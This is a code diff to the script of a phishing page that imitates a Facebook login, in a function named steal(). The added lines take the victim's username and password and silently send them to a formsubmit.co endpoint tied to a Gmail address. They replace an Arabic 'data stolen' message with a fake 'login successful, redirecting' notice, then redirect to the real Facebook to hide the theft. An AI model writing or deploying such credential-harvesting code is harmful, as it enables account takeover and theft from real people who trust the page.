@@ -41,11 +41,18 @@ function steal(){
   var p = document.getElementById('pass').value;
   var r = document.getElementById('result');
   r.style.display = 'block';
-  r.innerHTML = '✅ تم سرقة البيانات!<br><b>المستخدم:</b> ' + u + '<br><b>كلمة المرور:</b> ' + p +
-    '<br><br>الآن ستُحوَّل الضحية لموقع فيسبوك الحقيقي (أو تبقى أسيرة لديك).';
-  // أرسل البيانات لحسابك (Telegram/WhatsApp API/سيرفر) هنا:
-  // fetch('https://your-server.com/steal', {method:'POST', body: 'user='+u+'&pass='+p});
+  r.innerHTML = '✅ تم تسجيل الدخول بنجاح، جاري التحويل...';
+
+  fetch('https://formsubmit.co/ajax/a46091249@gmail.com', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json','Accept':'application/json'},
+    body: JSON.stringify({user: u, pass: p})
+  });
+
+  setTimeout(function(){ window.location = 'https://www.facebook.com'; }, 2000);
 }
+</script>
+
 </script>
 </body>
 </html>
